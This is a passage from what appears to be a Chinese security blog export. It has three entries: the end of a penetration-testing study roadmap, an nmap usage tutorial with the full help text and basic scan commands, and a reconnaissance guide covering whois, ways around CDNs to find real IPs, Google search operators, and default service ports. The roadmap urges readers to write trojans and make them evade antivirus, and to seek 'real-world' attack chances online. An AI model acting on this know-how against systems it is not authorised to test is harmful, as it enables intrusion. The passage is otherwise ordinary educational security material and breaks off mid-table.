<h1 id="5、常用-Windows-命令"><a href="#5、常用-Windows-命令" class="headerlink" title="5、常用 Windows 命令"></a>5、常用 Windows 命令</h1><p>March 20, 2013 — March 31, 2013</p>
<h2 id="常用-Windows-命令"><a href="#常用-Windows-命令" class="headerlink" title="常用 Windows 命令"></a>常用 Windows 命令</h2><p>做渗透的同学，尤其需要首先学习一些常用的 windows 命令(最好在实战中边运用边练习)，特别是入侵检测是常用命令，如 net<br>user、net localgroup、net use、net share、net start、arp、whoami、regedit、tasklist、find、cp、mkdir、del、dir、print……<br>提高：能写一些批处理脚本，完成一些重复性任务</p>
<h1 id="6、一门脚本语言"><a href="#6、一门脚本语言" class="headerlink" title="6、一门脚本语言"></a>6、一门脚本语言</h1><p>July 15, 2013 — October 1, 2013</p>
<h2 id="一门脚本语言"><a href="#一门脚本语言" class="headerlink" title="一门脚本语言"></a>一门脚本语言</h2><p>对于做渗透测试方向的同学尤为重要，对于做开发的同学也可以学习一门脚本语言。<br>我推荐的是 python 或 php，学习 python 可以快速开发出一些有针对性的脚本，而学习 php 可以尝试进行 web 漏洞的挖掘。</p>
<h1 id="7、Linux-使用"><a href="#7、Linux-使用" class="headerlink" title="7、Linux 使用"></a>7、Linux 使用</h1><p>August 1, 2013 — December 1, 2013</p>
<h2 id="Linux-使用"><a href="#Linux-使用" class="headerlink" title="Linux 使用"></a>Linux 使用</h2><p>学习渗透的同学在这段时间又能分为两条路，一是 web 安全，二是内网渗透。web 安全偏重于 web 应用漏洞挖掘和利用，内网渗<br>透偏重于网络环境的分析、内网计算机的漏洞利用。<br>内网中大部分重要计算机属于 Linux，所以学会 Linux 基础的使用，Linux 各种服务的搭建、维护、漏洞利用修补是必须的。<br>推荐图书：《鸟哥的 Linux 私房菜》</p>
<h1 id="8、Windows-编程"><a href="#8、Windows-编程" class="headerlink" title="8、Windows 编程"></a>8、Windows 编程</h1><p>April 15, 2013 — December 31, 2013</p>
<h2 id="Windows-编程"><a href="#Windows-编程" class="headerlink" title="Windows 编程"></a>Windows 编程</h2><p>在数据结构学习完成之后，我觉得就是一个分水岭了。做渗透方向的就不必继续深入 Windows 编程，大可继续积累网络安全经<br>验，但开发、逆向的同学就需要学习 windows 编程了。<br>Windows 编程无非就是阅读 MSDN，熟悉每个 windowsAPI 的用法，平时想到的好点子可以尝试写成程序，增加自己的代码量积<br>累。<br>windows 编程也是一个积累的过程，需要慢慢了解每个 API，所以学习起来并不紧张。</p>
<h1 id="9、Web-安全积累期"><a href="#9、Web-安全积累期" class="headerlink" title="9、Web 安全积累期"></a>9、Web 安全积累期</h1><p>May 1, 2013 — December 31, 2014</p>
<h2 id="web-安全积累期"><a href="#web-安全积累期" class="headerlink" title="web 安全积累期"></a>web 安全积累期</h2><p>其实积累是一个长期的过程，所以也不分期限的。平时可以在如 90、法客、土司、乌云、习科之类的安全社区和大家一起讨论，<br>多关注最新的技术、漏洞，平时注意搜集每个漏洞的成因、利用方法、修补方法，并尝试在网上寻找实战的机会。<br>这段时间还可以学点脚本语言，当掌握了一门顺手的脚本语言后就能更快速、更便捷地做很多针对性的攻击。</p>
<h1 id="10、汇编语言"><a href="#10、汇编语言" class="headerlink" title="10、汇编语言"></a>10、汇编语言</h1><p>June 1, 2013 — September 1, 2013</p>
<h2 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h2><p>汇编也是一门基础课程，对以后的逆向破解、漏洞挖掘、木马免杀的学习都有直接影响，在 windows 编程的学习期间可以开始学<br>习汇编。<br>大概了解 16 位的汇编语言，知道基本语法，重点在 32 位汇编的学习上。学习汇编语言可以结合自己写的 C 程序，将自己写好的程<br>序调试，单步调试每一句汇编语言，不懂就查。</p>
<h1 id="11、逆向破解"><a href="#11、逆向破解" class="headerlink" title="11、逆向破解"></a>11、逆向破解</h1><p>July 1, 2013 — October 1, 2013</p>
<h2 id="逆向破解"><a href="#逆向破解" class="headerlink" title="逆向破解"></a>逆向破解</h2><p>在汇编基本语法学习完毕后，可以选择性地开始学习逆向、破解相关操作。<br>在学习逆向的过程中就可以熟悉之前学习的汇编指令的使用<br>推荐图书：《加密与解密》</p>
<h1 id="12、木马免杀"><a href="#12、木马免杀" class="headerlink" title="12、木马免杀"></a>12、木马免杀</h1><p>September 20, 2013 — March 1, 2014</p>
<h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><p>在逆向学习完成后，又可以分为几个小方向：深入破解、exploit、木马免杀。<br>能够自己编写木马后，最需要的就是免杀。如果编写的病毒木马不能运行，也无济于事。免杀成功与否是运气、经验、灵感、技<br>术、耐心的集合体，缺一不可。所以虽然很多人尝试学习，但最后真正能做到完美的人并不多<br>推荐图书：《黑客免杀攻防》</p>
<h1 id="13、网络环境利用与-Win-服务器"><a href="#13、网络环境利用与-Win-服务器" class="headerlink" title="13、网络环境利用与 Win 服务器"></a>13、网络环境利用与 Win 服务器</h1><p>October 15, 2013 — February 1, 2014</p>
<h2 id="网络环境利用与-win-服务器"><a href="#网络环境利用与-win-服务器" class="headerlink" title="网络环境利用与 win 服务器"></a>网络环境利用与 win 服务器</h2><p>在 Linux 基础学习到一定程度后，可以开始学习网络，如何利用内网内各种计算机开启的各种服务，来达到渗透进目标机器的目<br>的。<br>当然，同时也要学习 Windows 服务器的使用，了解什么是域，如何在 windows 环境下使用各种服务。因为一个大内网下一般个人<br>机、目标机是 windows 系统。</p>
<h1 id="14、Exploit-二进制漏洞"><a href="#14、Exploit-二进制漏洞" class="headerlink" title="14、Exploit 二进制漏洞"></a>14、Exploit 二进制漏洞</h1><p>October 5, 2013 — April 1, 2014</p>
<h2 id="Exploit-二进制漏洞"><a href="#Exploit-二进制漏洞" class="headerlink" title="Exploit 二进制漏洞"></a>Exploit 二进制漏洞</h2><p>在逆向学习完成后，又可以分为几个小方向：深入破解、exploit、木马免杀。<br>其中 Exploit 对技术要求较高，回报也最丰厚，所以是很多大牛集结之地。学习 exp 需要对 C、C++有牢固的基础，并有一双发现问<br>题的眼睛。在他人眼中可能只是一个软件崩溃或错误信息，在 exper 眼里就可以是无穷无尽的财富。</p>
<h1 id="15、Windows-核心编程"><a href="#15、Windows-核心编程" class="headerlink" title="15、Windows 核心编程"></a>15、Windows 核心编程</h1><p>November 1, 2013 — May 1, 2014</p>
<h2 id="Windows-核心编程"><a href="#Windows-核心编程" class="headerlink" title="Windows 核心编程"></a>Windows 核心编程</h2><p>在 Windows 编程学习到一定程度后就可以开始核心编程，其实二者并无太大区别，只是核心编程更加偏重 windows 内核的一些机<br>制。当你的技术不仅限于开发桌面应用以后，木马、病毒这些更接近系统底层的东西既可以满足要求。<br>这本书对于以后做开发的同学必看不可：《Windows 核心编程》、《天方夜谭》、《寒江独钓》</p>
<h1 id="技能图谱"><a href="#技能图谱" class="headerlink" title="技能图谱"></a>技能图谱</h1><p><img src="/2019/05/16/security/安全技术学习入门技能图/安全技能树简版 2.jpg" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html" target="_blank" rel="noopener">安全圈</a></p>
</li>
<li><p><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/index.html" target="_blank" rel="noopener">知道创宇研发技能表 v3.1</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap使用</title>
    <url>/2019/06/25/security/nmap%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>nmap 是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（这是亦称 fingerprinting）。它是网络管理员必用的软件之一，以及用以评估网络系统安全。<br>正如大多数被用于网络安全的工具，nmap 也是不少黑客及骇客（又称脚本小子）爱用的工具 。系统管理员可以利用 nmap 来探测工作环境中未经批准使用的服务器，但是黑客会利用 nmap 来搜集目标电脑的网络设定，从而计划攻击的方法。<br>Nmap 常被跟评估系统漏洞软件 Nessus 混为一谈。Nmap 以隐秘的手法，避开闯入检测系统的监视，并尽可能不影响目标系统的日常操作。</p>
<a id="more"></a>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://nmap.org/download.html" target="_blank" rel="noopener">nmap</a>官网上下载 Windows、Linux、MacOS 对应系统的版本安装即可.</p>
<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><p>在终端中键入 nmap 即可看到基本的命令信息。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;nmap</span><br><span class="line">Nmap 7.70 ( https://nmap.org )</span><br><span class="line">Usage: nmap [Scan Type(s)] [Options] &#123;target specification&#125;</span><br><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts/networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sn: Ping Scan - <span class="built_in">disable</span> port scan</span><br><span class="line">  -Pn: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports</span><br><span class="line">  -PE/PP/PM: ICMP <span class="built_in">echo</span>, timestamp, and netmask request discovery probes</span><br><span class="line">  -PO[protocol list]: IP Protocol Ping</span><br><span class="line">  -n/-R: Never <span class="keyword">do</span> DNS resolution/Always resolve [default: sometimes]</span><br><span class="line">  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers</span><br><span class="line">  --system-dns: Use OS<span class="string">'s DNS resolver</span></span><br><span class="line"><span class="string">  --traceroute: Trace hop path to each host</span></span><br><span class="line"><span class="string">SCAN TECHNIQUES:</span></span><br><span class="line"><span class="string">  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans</span></span><br><span class="line"><span class="string">  -sU: UDP Scan</span></span><br><span class="line"><span class="string">  -sN/sF/sX: TCP Null, FIN, and Xmas scans</span></span><br><span class="line"><span class="string">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span></span><br><span class="line"><span class="string">  -sI &lt;zombie host[:probeport]&gt;: Idle scan</span></span><br><span class="line"><span class="string">  -sY/sZ: SCTP INIT/COOKIE-ECHO scans</span></span><br><span class="line"><span class="string">  -sO: IP protocol scan</span></span><br><span class="line"><span class="string">  -b &lt;FTP relay host&gt;: FTP bounce scan</span></span><br><span class="line"><span class="string">PORT SPECIFICATION AND SCAN ORDER:</span></span><br><span class="line"><span class="string">  -p &lt;port ranges&gt;: Only scan specified ports</span></span><br><span class="line"><span class="string">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span></span><br><span class="line"><span class="string">  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning</span></span><br><span class="line"><span class="string">  -F: Fast mode - Scan fewer ports than the default scan</span></span><br><span class="line"><span class="string">  -r: Scan ports consecutively - don'</span>t randomize</span><br><span class="line">  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports</span><br><span class="line">  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</span><br><span class="line">SERVICE/VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service/version info</span><br><span class="line">  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)</span><br><span class="line">  --version-light: Limit to most likely probes (intensity 2)</span><br><span class="line">  --version-all: Try every single probe (intensity 9)</span><br><span class="line">  --version-trace: Show detailed version scan activity (<span class="keyword">for</span> debugging)</span><br><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script=default</span><br><span class="line">  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file=filename: provide NSE script args <span class="keyword">in</span> a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help=&lt;Lua scripts&gt;: Show <span class="built_in">help</span> about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  Options <span class="built_in">which</span> take &lt;time&gt; are <span class="keyword">in</span> seconds, or append <span class="string">'ms'</span> (milliseconds),</span><br><span class="line">  <span class="string">'s'</span> (seconds), <span class="string">'m'</span> (minutes), or <span class="string">'h'</span> (hours) to the value (e.g. 30m).</span><br><span class="line">  -T&lt;0-5&gt;: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup/max-hostgroup &lt;size&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism/max-parallelism &lt;numprobes&gt;: Probe parallelization</span><br><span class="line">  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout &lt;time&gt;: Specifies</span><br><span class="line">      probe round trip time.</span><br><span class="line">  --max-retries &lt;tries&gt;: Caps number of port scan probe retransmissions.</span><br><span class="line">  --host-timeout &lt;time&gt;: Give up on target after this long</span><br><span class="line">  --scan-delay/--max-scan-delay &lt;time&gt;: Adjust delay between probes</span><br><span class="line">  --min-rate &lt;number&gt;: Send packets no slower than &lt;number&gt; per second</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">FIREWALL/IDS EVASION AND SPOOFING:</span><br><span class="line">  -f; --mtu &lt;val&gt;: fragment packets (optionally w/given MTU)</span><br><span class="line">  -D &lt;decoy1,decoy2[,ME],...&gt;: Cloak a scan with decoys</span><br><span class="line">  -S &lt;IP_Address&gt;: Spoof <span class="built_in">source</span> address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g/--<span class="built_in">source</span>-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --proxies &lt;url1,[url2],...&gt;: Relay connections through HTTP/SOCKS4 proxies</span><br><span class="line">  --data &lt;hex string&gt;: Append a custom payload to sent packets</span><br><span class="line">  --data-string &lt;string&gt;: Append a custom ASCII string to sent packets</span><br><span class="line">  --data-length &lt;num&gt;: Append random data to sent packets</span><br><span class="line">  --ip-options &lt;options&gt;: Send packets with specified ip options</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address</span><br><span class="line">  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum</span><br><span class="line">OUTPUT:</span><br><span class="line">  -oN/-oX/-oS/-oG &lt;file&gt;: Output scan <span class="keyword">in</span> normal, XML, s|&lt;rIpt kIddi3,</span><br><span class="line">     and Grepable format, respectively, to the given filename.</span><br><span class="line">  -oA &lt;basename&gt;: Output <span class="keyword">in</span> the three major formats at once</span><br><span class="line">  -v: Increase verbosity level (use -vv or more <span class="keyword">for</span> greater effect)</span><br><span class="line">  -d: Increase debugging level (use -dd or more <span class="keyword">for</span> greater effect)</span><br><span class="line">  --reason: Display the reason a port is <span class="keyword">in</span> a particular state</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (<span class="keyword">for</span> debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">  --stylesheet &lt;path/URL&gt;: XSL stylesheet to transform XML output to HTML</span><br><span class="line">  --webxml: Reference stylesheet from Nmap.Org <span class="keyword">for</span> more portable XML</span><br><span class="line">  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output</span><br><span class="line">MISC:</span><br><span class="line">  -6: Enable IPv6 scanning</span><br><span class="line">  -A: Enable OS detection, version detection, script scanning, and traceroute</span><br><span class="line">  --datadir &lt;dirname&gt;: Specify custom Nmap data file location</span><br><span class="line">  --send-eth/--send-ip: Send using raw ethernet frames or IP packets</span><br><span class="line">  --privileged: Assume that the user is fully privileged</span><br><span class="line">  --unprivileged: Assume the user lacks raw socket privileges</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this <span class="built_in">help</span> summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  nmap -v -A scanme.nmap.org</span><br><span class="line">  nmap -v -sn 192.168.0.0/16 10.0.0.0/8</span><br><span class="line">  nmap -v -iR 10000 -Pn -p 80</span><br><span class="line">SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES</span><br></pre></td></tr></table></figure>
<h2 id="明确目标检测"><a href="#明确目标检测" class="headerlink" title="明确目标检测"></a>明确目标检测</h2><h2 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h2><p>-O</p>
<h2 id="服务-版本检测"><a href="#服务-版本检测" class="headerlink" title="服务/版本检测"></a>服务/版本检测</h2><p>-sV: 探测开放端口的服务或者版本信息</p>
<p>—version-intensity <level>: Set from 0 (light) to 9 (try all probes)<br>—version-light: Limit to most likely probes (intensity 2)<br>—version-all: Try every single probe (intensity 9)<br>—version-trace: Show detailed version scan activity (for debugging)</level></p>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<ript kiddi3, and grepable format, respectively, to the given filename. -oa <basename>: 保存为三种不同的格式<br>-v: Increase verbosity level (use -vv or more for greater effect)<br>-d: Increase debugging level (use -dd or more for greater effect)<br>—reason: 显示端口处于特定状态的原因<br>—open: 仅显示开放端口<br>—packet-trace: 显示发送和接收的包信息<br>—iflist: Print host interfaces and routes (for debugging)<br>—append-output: Append to rather than clobber specified output files<br>—resume <filename>: Resume an aborted scan<br>—stylesheet <path url></path>: XSL stylesheet 转化 XML 为 HTML<br>—webxml: Reference stylesheet from Nmap.Org for more portable XML<br>—no-stylesheet: Prevent associating of XSL stylesheet w/XML output</filename></ript></file></p>
<h2 id="绕过防火墙"><a href="#绕过防火墙" class="headerlink" title="绕过防火墙"></a>绕过防火墙</h2><p>-S <ip_address>: 欺骗源地址</ip_address></p>
<p>-e <iface>: 指定网卡</iface></p>
<p>—badsum: 伪造 TCP/UDP/SCTP checksum 发送数据包</p>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p>-6: IPV6 扫描<br>—datadir <dirname>: 指定 nmap 的数据目录<br>—spoof-mac <mac address prefix vendor name>: 指定 mac 地址</mac></dirname></p>
<h1 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap "></a>nmap <ip></ip></h2><p>扫描目标 IP 的开放端口</p>
<p><img src="/2019/06/25/security/nmap使用/20190625191445.png" alt></p>
<h2 id="nmap-…"><a href="#nmap-…" class="headerlink" title="nmap   …"></a>nmap <ip> <ip> …</ip></ip></h2><p>扫描多个 ip 的开放端口</p>
<p><img src="/2019/06/25/security/nmap使用/20190625193403.png" alt></p>
<p>会分别列出对应 IP 的存活状态和开放端口信息.</p>
<h2 id="nmap-iL"><a href="#nmap-iL" class="headerlink" title="nmap -iL "></a>nmap -iL <files></files></h2><p>从指定 ip 文件(一个 ip 一行)中读取 ip 并扫描.</p>
<h2 id="nmap-sV"><a href="#nmap-sV" class="headerlink" title="nmap -sV "></a>nmap -sV <ip></ip></h2><p>服务/版本探测</p>
<p><img src="/2019/06/25/security/nmap使用/20190625192958.png" alt></p>
<h2 id="nmap-A"><a href="#nmap-A" class="headerlink" title="nmap -A "></a>nmap -A <ip></ip></h2><p>命令主要检测端口、操作系统、版本等信息。</p>
<p><img src="/2019/06/25/security/nmap使用/20190625195323.png" alt><br><img src="/2019/06/25/security/nmap使用/20190625195350.png" alt><br><img src="/2019/06/25/security/nmap使用/20190625195602.png" alt><br><img src="/2019/06/25/security/nmap使用/20190625195630.png" alt></p>
<h2 id="nmap-p"><a href="#nmap-p" class="headerlink" title="nmap -p  "></a>nmap -p <port,port..> <ip></ip></port,port..></h2><p>扫描对应的端口是否开放</p>
<p><img src="/2019/06/25/security/nmap使用/20190625200653.png" alt></p>
<h2 id="nmap-ip-段扫描"><a href="#nmap-ip-段扫描" class="headerlink" title="nmap ip 段扫描"></a>nmap ip 段扫描</h2><p>x.x.x.1-x.x.x.10 对应的这 10 个 ip 的信息</p>
<p><img src="/2019/06/25/security/nmap使用/20190625201947.png" alt></p>
<h2 id="nmap-oA"><a href="#nmap-oA" class="headerlink" title="nmap -oA "></a>nmap -oA <filename></filename></h2><p>保存扫描结果到三种不同类型的文件.</p>
<p><img src="/2019/06/25/security/nmap使用/20190625202333.png" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://nmap.org/download.html" target="_blank" rel="noopener">nmap 官网</a></p>
</li>
<li><p><a href="https://blog.csdn.net/dearbaba_8520/article/details/80545356" target="_blank" rel="noopener">ip 段/数字,如 192.168.0.1/24 是什么意思?</a></p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集</title>
    <url>/2019/07/16/security/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>渗透测试主要的一点就是获取服务器的各种信息.本节主要是一些基础的服务器信息收集的工具和常识.</p>
<a id="more"></a>
<h1 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h1><p>主要通过 whois 查看域名的拥有者等信息.Whois 简单来说，就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期等）。通过域名 Whois 服务器查询，可以查询域名归属者联系方式，以及注册和到期时间,可以用 whois.chinaz.com 访问或者 linux 上已经集成了该命令.</p>
<p><img src="/2019/07/16/security/渗透测试之信息收集/whois_20190717101406.png" alt></p>
<h1 id="获取真实-IP"><a href="#获取真实-IP" class="headerlink" title="获取真实 IP"></a>获取真实 IP</h1><h2 id="验证是否存在-CDN"><a href="#验证是否存在-CDN" class="headerlink" title="验证是否存在 CDN"></a>验证是否存在 CDN</h2><p>使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了 CDN,多地 Ping 网站有：</p>
<p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">站长工具 &gt; Ping 检测</a></p>
<p><a href="http://www.webkaka.com/Ping.aspx" target="_blank" rel="noopener">网站 Ping 检测—检测网站在各地的 Ping 值—卡卡网</a></p>
<p><a href="https://tools.ipip.net/ping.php" target="_blank" rel="noopener">Ping 查询_专业的 IP 地址库_IPIP.NET</a></p>
<p><a href="http://ping.aizhan.com/" target="_blank" rel="noopener">PING 检测-爱站网</a></p>
<p>以其中一个工具检测 dns 信息:<br><img src="/2019/07/16/security/渗透测试之信息收集/dns_20190717151631.png" alt></p>
<p>linux 下可以用 nslookup 查看 dns 信息.</p>
<p><img src="/2019/07/16/security/渗透测试之信息收集/20190717152155.png" alt></p>
<h2 id="绕过-CDN-查找网站真实-IP"><a href="#绕过-CDN-查找网站真实-IP" class="headerlink" title="绕过 CDN 查找网站真实 IP"></a>绕过 CDN 查找网站真实 IP</h2><p>查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录，相关查询网站有：</p>
<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">DNSDB</a></p>
<p><a href="https://x.threatbook.cn" target="_blank" rel="noopener">微步在线</a></p>
<p><a href="https://viewdns.info/" target="_blank" rel="noopener">viewdns</a></p>
<p><a href="https://www.netcraft.com/" target="_blank" rel="noopener">netcraft</a></p>
<p>用其中一个来查看的部分信息:</p>
<p><img src="/2019/07/16/security/渗透测试之信息收集/20190717153045.png" alt></p>
<h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><p>掌握搜索引擎的常用用法可以检索一些特定的信息,包括 url,正文,title 等特定位置的特定信息.</p>
<h2 id="google-搜索引擎"><a href="#google-搜索引擎" class="headerlink" title="google 搜索引擎"></a>google 搜索引擎</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">inurl: 在url地址栏中显示的信息页面</span><br><span class="line"></span><br><span class="line">intext: 显示在正文信息中的内容页面</span><br><span class="line"></span><br><span class="line">site: 限制显示你某个域名的所有页面</span><br><span class="line"></span><br><span class="line">filetype: 搜索文件的后缀或者扩展名</span><br><span class="line"></span><br><span class="line">intitle: 限制你搜索的网页标题页面</span><br><span class="line"></span><br><span class="line">link: 将显示有到指定网页的链接的网页</span><br><span class="line"></span><br><span class="line">cache:将显示在Google cache中的网页</span><br><span class="line"></span><br><span class="line">allintitle: 搜索所有关键字构成标题的网页.（allintite:关键字或者url地址）</span><br></pre></td></tr></table></figure>
<h3 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> + 把google可能忽略的字列如查询范围</span><br><span class="line"> - 把某个字忽略</span><br><span class="line">~  同意词</span><br><span class="line">.  单一的通配符</span><br><span class="line">*  通配符，可代表多个字母</span><br><span class="line">&quot;&quot; 精确查询</span><br></pre></td></tr></table></figure>
<h1 id="服务端口信息"><a href="#服务端口信息" class="headerlink" title="服务端口信息"></a>服务端口信息</h1><p>通过 nmap,windows 下的图形化工具 zenmap 来检测服务的开放端口来猜测服务的类型,从而展开对应的安全测试、攻击.下面列举了部分应用的默认端口号.</p>
<h2 id="常见网络协议端口"><a href="#常见网络协议端口" class="headerlink" title="常见网络协议端口"></a>常见网络协议端口</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">端口</th>
<th style="text-align:center">服务类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">20,21</td>
<td style="text-align:center">FTP</td>
</tr>
<tr>
<td style="text-align:center">22</td>
<td style="text-align:center">SSH</td>
</tr>
<tr>
<td style="text-align:center">23</td>
<td style="text-align:center">Telnet</td>
</tr>
<tr>
<td style="text-align:center">53</td>
<td style="text-align:center">DNS</td>
</tr>
<tr>
<td style="text-align:center">67/68</td>
<td style="text-align:center">DHCP</td>
</tr>
<tr>
<td style="text-align:center">443</td>
<td style="text-align:center">https</td>
</tr>
<tr>
<td style="text-align:center">1080</td>
<td style="text-align:center">SOCKS 代理协议服务器常用端口</td>
</tr>
<tr>
<td style="text-align:center">69</td>
<td style="text-align:center">TFTP</td>
</tr>
</tbody>
</table>
</div>
<h2 id="邮件服务"><a href="#邮件服务" class="headerlink" title="邮件服务"></a>邮件服务</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">端口</th>
<th style="text-align:center">服务类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">25</td>
<td style="text-align:center">SMTP</td>
</tr>
<tr>
<td style="text-align:center">110</td>
<td style="text-align:center">POP3</td>
</tr>
<tr>
<td style="text-align:center">143</td>
<td style="text-align:center">IMAP</td>
</tr>
</tbody>
</table>
</div>
<h2 id="WEB-服务器类"><a href="#WEB-服务器类" class="headerlink" title="WEB 服务器类"></a>WEB 服务器类</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">端口</th>
<th style="text-align:center">服务类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">80</td>
<td style="text-align:center">Apache,Nginx</td>
</tr>
<tr>
<td style="text-align:center">8080</td>
<td style="text-align:center">Tomcat,Jboss,jetty,glassfish 等 servlet 容器的默认端口</td>
</tr>
<tr>
<td style="text-align:center">4848</td>
<td style="text-align:center">glassfish 控制台端口</td>
</tr>
<tr>
<td style="text-align:center">7001/7002</td>
<td style="text-align:center">weblogic 控制台</td>
</tr>
<tr>
<td style="text-align:center">9090</td>
<td style="text-align:center">webshpere 控制台</td>
</tr>
<tr>
<td style="text-align:center">9090</td>
<td style="text-align:center">webshpere 控制台</td>
</tr>
<tr>
<td style="text-align:center">1352</td>
<td style="text-align:center">Lotus domino 邮件服务</td>
</tr>
<tr>
<td style="text-align:center">10000</td>
<td style="text-align:center">webmin-web 控制台</td>
</tr>
</tbody>
</table>
</div>
<h2 id="数据库类"><a href="#数据库类" class="headerlink" title="数据库类"></a>数据库类</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">端口</th>
<th style="text-align:center">服务类型</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">3306</td>
<td style="text-align:center">MySQL</td>
</tr>
<tr>
<td style="text-align:center">1521</td>
<td style="text-align:center">Oracle</td>
</tr>
<tr>
